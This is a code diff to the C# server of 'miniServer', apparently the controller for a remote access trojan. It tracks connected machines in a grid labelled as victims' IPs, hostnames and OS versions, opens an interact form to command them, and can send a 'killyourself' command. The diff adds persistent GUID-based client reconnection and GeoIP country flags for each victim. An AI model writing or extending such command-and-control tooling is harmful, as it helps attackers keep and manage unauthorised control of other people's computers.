@@ -1,5 +1,9 @@
-﻿using System;
+﻿using miniServer.GeoIP;
+using miniServer.Properties;
+using System;
 using System.Collections.Generic;
+using System.Drawing;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -13,7 +17,6 @@ namespace miniServer
         //must be same in client and server.
         const string separator = "|||";
         private static Mutex gridMutex = new Mutex();
-        private static Mutex idMutex = new Mutex();
 
         Thread serverThread;
         TcpListener serverTcp;
@@ -103,7 +106,6 @@ namespace miniServer
                                 //string hostName = receive[3];
 
                                 //A new client
-                                //AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
                                 AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming);
                                 return;
 
@@ -129,34 +131,63 @@ namespace miniServer
 
         void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
         {
-            idMutex.WaitOne();
-            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
-            clientList.Add(mc);
-            idMutex.ReleaseMutex();
+            string ClientIdString = incomming.Split(new string[] { separator }, StringSplitOptions.None)[0];
+            miniClient mc = clientList?.Where(e => e.ID.ToString() == ClientIdString.ToString()).FirstOrDefault();
+            if (mc == null)
+            {
+                Guid Id;
+                bool _isValidClientId = Guid.TryParse(ClientIdString, out Id);
+                if (!_isValidClientId || Id == Guid.Empty)
+                    Id = Guid.NewGuid();
+                mc = new miniClient(Id, tcpClient, os, version, hostName);
+                clientList.Add(mc);
+            }
+            else
+            {
+                mc.RenewConnection(tcpClient, mc.IsAlive);// when this connection is new client with same guid key then kill exist client and renew it
+            }
 
             //Hello is for future use
             mc.SendToClient(mc.ID.ToString() + separator + "Hello");
 
-            //ADD new client to datagridview
-            DataGridViewRow row = new DataGridViewRow();
-            row.CreateCells(dataGridViewClients);
-            //TODO:IP country Flag
-            //row.Cells[0].Value = getFlagOfIP(sc.IP);//IP country Flag
-            row.Cells[1].Value = mc.ID;//ID
-                                       //Note is emty
-            row.Cells[3].Value = mc.IP;//Victim IP and Port
-            row.Cells[4].Value = mc.HostName;//Victim HostName
-            row.Cells[5].Value = mc.OS;//Victim OS version
-            row.Cells[6].Value = mc.Version;//Client Version
-            row.Cells[7].Value = "Yes";//isAlive
-
+            string ConnectionStatus = string.Empty;
             gridMutex.WaitOne();
             dataGridViewClients.Invoke((MethodInvoker)delegate
             {
-                dataGridViewClients.Rows.Add(row);
+                var existRow = dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault();
+                if (existRow == null) //ADD new client to datagridview
+                {
+                    DataGridViewRow row = new DataGridViewRow();
+                    row.CreateCells(dataGridViewClients);
+                    //TODO:IP country Flag
+                    row.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
+                    row.Cells[1].Value = mc.ID;//ID
+                                               //Note is empty
+                    row.Cells[3].Value = mc.IP;//Victim IP and Port
+                    row.Cells[4].Value = mc.HostName;//Victim HostName
+                    row.Cells[5].Value = mc.OS;//Victim OS version
+                    row.Cells[6].Value = mc.Version;//Client Version
+                    row.Cells[7].Value = "Yes";//isAlive
+                    dataGridViewClients.Rows.Add(row);
+                    ConnectionStatus = "Connected";
+                }
+                else
+                {
+                    existRow.Cells[0].Value = getFlagOfIP(mc.IP);//getFlagOfIP(mc.IP);//IP country Flag
+                    existRow.Cells[1].Value = mc.ID;//ID
+                    existRow.Cells[2].Value = mc.Note; //Note 
+                    existRow.Cells[3].Value = mc.IP;//Victim IP and 
+                    existRow.Cells[4].Value = mc.HostName;//Victim HostName
+                    existRow.Cells[5].Value = mc.OS;//Victim OS version
+                    existRow.Cells[6].Value = mc.Version;//Client Version
+                    existRow.Cells[7].Value = "Yes";//isAlive
+                    ConnectionStatus = "ReConnected";
+                }
             });
+
+
             gridMutex.ReleaseMutex();
-            writelog(mc.IP + " -> Connected :) : " + incomming, "");
+            writelog(mc.IP + " -> " + ConnectionStatus + " :) : " + incomming.Replace(incomming.Split(new string[] { separator }, StringSplitOptions.None)[0], mc.ID.ToString()), "");
         }
 
         void writelog(string log, string extradata)
@@ -171,7 +202,8 @@ namespace miniServer
                 });
                 return;
             }
-            else {
+            else
+            {
                 richTextBoxLog.Invoke((MethodInvoker)delegate
                 {
                     richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n").Replace(separator, "_");
@@ -196,20 +228,20 @@ namespace miniServer
 
         private void openInteractForm()
         {
-            if(dataGridViewClients.CurrentCell != null)
+            if (dataGridViewClients.CurrentCell != null)
             {
-                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;
+                Guid id = (Guid)dataGridViewClients.CurrentRow.Cells[1].Value;
 
-                if (clientList[i].Interact)
+                if (clientList.Where(e => e.ID == id).FirstOrDefault().Interact)
                 {
-                   // if (disableOpenWarningToolStripMenuItem.Checked)
-                        MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK,MessageBoxIcon.Error);
+                    // if (disableOpenWarningToolStripMenuItem.Checked)
+                    MessageBox.Show("Client is already open in another interact form.", "Client is open", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
                     foreach (Form frm in Application.OpenForms)
                         if (frm.Name == "InteractForm")
                         {
                             InteractForm intForm = (InteractForm)frm;
-                            if (intForm.mc.ID == i)
+                            if (intForm.mc.ID == id)
                             {
                                 intForm.WindowState = FormWindowState.Normal;
                                 intForm.Focus();
@@ -219,13 +251,13 @@ namespace miniServer
                             }
                         }
                 }
-                if (!clientList[i].IsAlive)
+                if (!clientList.Where(e => e.ID == id).FirstOrDefault().IsAlive)
                 {
                     if (MessageBox.Show("It seems the client not available, do you want to interact with it?", "Client is not alive", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                         return;
                 }
 
-                InteractForm f = new InteractForm(clientList[i], separator);
+                InteractForm f = new InteractForm(clientList.Where(e => e.ID == id).FirstOrDefault(), separator);
                 f.Show();
             }
 
@@ -234,15 +266,25 @@ namespace miniServer
 
         private void EditNoteToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //TODO: open edit note form
+            if (dataGridViewClients.CurrentCell.RowIndex > -1)
+            {
+                if (dataGridViewClients.CurrentCell != null)
+                {
+                    Guid id = (Guid)dataGridViewClients.CurrentRow.Cells["id"].Value;//id
+                    editNoteForm editFrm = new editNoteForm(clientList.Where(r => r.ID == id).FirstOrDefault().Note);
+                    editFrm.ShowDialog();
+                    clientList.Where(r => r.ID == id).FirstOrDefault().Note = editFrm.note;
+                    dataGridViewClients.CurrentRow.Cells["note"].Value = editFrm.note;
+                }
+            }
         }
 
         private void KillToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (dataGridViewClients.CurrentCell != null)
             {
-                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;//get id
-                if (clientList[i].IsAlive == false)
+                Guid id = (Guid)dataGridViewClients.CurrentRow.Cells[1].Value;//get id
+                if (clientList.Where(r => r.ID == id).FirstOrDefault().IsAlive == false)
                 {
                     MessageBox.Show("He is dead", "is dead", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     return;
@@ -251,8 +293,8 @@ namespace miniServer
                 if (MessageBox.Show("Are U sure to KILL Client process?", "Kill Client", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) == DialogResult.Yes)
                 {
                     //Quick and dirty way need to run in thread
-                    clientList[i].SendToClient("killyourself");
-                    clientList[i].IsAlive = false;
+                    clientList.Where(r => r.ID == id).FirstOrDefault().SendToClient("killyourself");
+                    clientList.Where(r => r.ID == id).FirstOrDefault().IsAlive = false;
                     dataGridViewClients.CurrentRow.Cells[7].Value = "False";//update data grid
                 }
             }
@@ -316,7 +358,8 @@ namespace miniServer
                         wait++;
                     }
                     throw new Exception(" Don't response to version command.");
-                }catch(Exception ex)
+                }
+                catch (Exception ex)
                 {
                     mc.IsAlive = false;
                     mc.client.Close();
@@ -324,7 +367,7 @@ namespace miniServer
                     gridMutex.WaitOne();
                     dataGridViewClients.Invoke((MethodInvoker)delegate
                     {
-                        dataGridViewClients["live", mc.ID].Value = "NO";
+                        dataGridViewClients.Rows.Cast<DataGridViewRow>().Where(r => r.Cells[1].Value.ToString().Equals(mc.ID.ToString())).FirstOrDefault().Cells["live"].Value = "NO";
                     });
                     gridMutex.ReleaseMutex();
 
@@ -335,6 +378,53 @@ namespace miniServer
                     });
                 }
             }
+        }
+
+        /// <summary>
+        /// Cache for flag images to reduce external connections.
+        /// </summary>
+        Dictionary<string, string> flagCache = new Dictionary<string, string>();
+        /// <summary>
+        /// Get ip return country flag
+        /// </summary>
+        /// <param name="ip"></param>
+        /// <returns></returns>
+        private Image getFlagOfIP(string ip)
+        {
+            string country = "xy";
+
+            if (flagCache.ContainsKey(ip))
+            {
+                flagCache.TryGetValue(ip, out country);//read image from cache
+                return (Image)Properties.Resources.ResourceManager.GetObject(country);
+            }
+            if (ip != "127.0.0.1")
+            {
+                GeoLocationHelper geoip = new GeoLocationHelper();
+                geoip.Initialize(ip);
+                country = geoip.GeoInfo.CountryCode;
+                if (country == null)//No country found
+                    country = "xy";
+                else
+                    country = country.ToLower();
+
+                string[] internal_names = new string[] { "as", "do", "in", "is" };
+                if (internal_names.Contains(country))
+                    country = "_" + country;
+            }
+
+            if (!flagCache.ContainsKey(ip))//add to cache
+                flagCache.Add(ip, country);
+            object O = Resources.ResourceManager.GetObject(country);
+            return (Image)O;
+
+            /* other information  */
+            //label1.Text = geoip.GeoInfo.Country;
+            //label2.Text = geoip.GeoInfo.City;
+            //label3.Text = geoip.GeoInfo.CountryCode;
+            //label4.Text = geoip.ImageIndex.ToString();
+            
+
         }
     }
 }
